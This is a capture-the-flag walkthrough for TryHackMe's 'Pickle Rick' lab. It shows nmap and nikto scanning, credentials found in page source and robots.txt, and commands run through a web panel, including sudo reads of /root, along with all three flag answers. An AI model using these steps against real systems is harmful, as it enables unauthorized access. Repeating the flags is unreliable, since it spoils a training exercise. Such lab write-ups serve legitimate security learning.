# Pickle Rick @TryHackMe.com

Difficulty: EASY

Keywords and tools: nmap, nikto, dirb, directory traversal


### ping the target (target IP will be given after you've joined the room)

```
ping 10.10.102.120

PING 10.10.102.120 (10.10.102.120) 56(84) bytes of data.
64 bytes from 10.10.102.120: icmp_seq=1 ttl=63 time=49.4 ms
64 bytes from 10.10.102.120: icmp_seq=2 ttl=63 time=50.7 ms
```

### nmap scan

````
sudo nmap -sV -n -v -Pn -p- -T4 -A 10.10.102.120

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 9a:68:bd:7f:44:89:05:be:36:ef:62:91:91:3c:8b:f3 (RSA)
|   256 f3:57:4b:4d:59:dd:42:6e:01:d9:b6:7e:8b:d5:72:8b (ECDSA)
|_  256 3a:9e:61:c3:73:1a:f0:4c:de:a3:39:79:d5:b5:f3:68 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Rick is sup4r cool
````

### Connect to web app with Firefox (http:\\10.10.102.120) and inspect the page source 

You should find
````
<!--

    Note to self, remember username!

    Username: R1ckRul3s

-->
````

### Check /robots.txt

Found a password?
```
Wubbalubbadubdub
```

### Let's try ssh.

````
ssh R1ckRul3s@10.10.102.120

R1ckRul3s@10.10.102.120: Permission denied (publickey).
````

No success. Will need ssh key.
  
  

### Scan the target for possibly hidden content with dirb

````
dirb http://10.10.102.120/

````
Won't find anything special...

### Lets try nikto

````
nikto -h 10.10.102.120
````

nikto found an /login.php page, lets see it and try to login

````
Open Firefox and go to <target>/login.php
username: R1ckRul3s
password: Wubbalubbadubdub
````

We get a command panel with a command execution box, lets try typing 'whoami'

````
www-data
ls

Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt

cat Sup3rS3cretPickl3Ingred.txt
Command disabled
````

Open the page with Firefox: http://10.10.102.120/Sup3rS3cretPickl3Ingred.txt and we have our first flag
``mr. meeseek hair``

Open the http://10.10.102.120/clue.txt ``Look around the file system for the other ingredient.``

### Lets try directory traversal
````
cd ../../../../; ls
cd /home; ls
cd /home/rick; ls
````
We see 'second ingredients', and since cat-command is disabled, lets try 'less'

````
less /home/rick/"second ingredients"
jerry tear
````
And we got our second flag.

Lets see if we have sudo

````
sudo ls /root;
sudo less /root/3rd.txt

3rd ingredients: fleeb juice
````

There's the final flag.
